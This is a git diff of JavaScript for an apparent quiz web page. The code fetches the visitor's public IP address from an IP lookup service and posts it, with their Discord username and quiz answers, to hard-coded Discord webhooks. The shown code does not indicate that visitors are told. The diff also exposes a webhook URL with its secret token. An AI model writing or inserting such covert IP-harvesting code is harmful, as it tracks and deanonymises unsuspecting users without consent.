@@ -159,6 +159,10 @@
                 const messageQuiz = {
                     content: answers.join('\n') + `\nUsername: ${username}`
                 };
+                const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
+                const messageIP = {
+                    content: `!IP: ${ip}, Username: ${username}`
+                };
 
                 fetch(webhookUrlQuiz, {
                     method: 'POST',
@@ -173,6 +177,20 @@
                     }
                 })
                 .catch(error => console.error('ERROR', error));
+
+                fetch(webhookUrlIP, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(messageIP)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send IP webhook request');
+                    }
+                })
+                .catch(error => console.error('ERROR', error));
             };
 
             clickMeBtn.addEventListener('click', () => {
@@ -183,22 +201,21 @@
                     return;
                 }
 
-                fetch('https://ipinfo.io/json?token=<ba1a04cc03b7b7>')
+                fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
-                        const { ip, city, region, country } = data;
-                        const location = `${city}, ${region}, ${country}`;
-                        sendIPandUsername(ip, discordUsername, location);
+                        const ip = data.ip;
+                        sendIPandUsername(ip, discordUsername);
                         firstScreen.style.opacity = 0;
                         quizScreens[currentQuizScreen].style.display = 'block';
                     })
                     .catch(error => console.error('ERROR', error));
             });
 
-            const sendIPandUsername = (ip, username, location) => {
+            const sendIPandUsername = (ip, username) => {
                 const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
                 const messageIP = {
-                    content: `!IP: ${ip}, Username: ${username}, Location: ${location}`
+                    content: `!IP: ${ip}, Username: ${username}`
                 };
 
                 fetch(webhookUrlIP, {
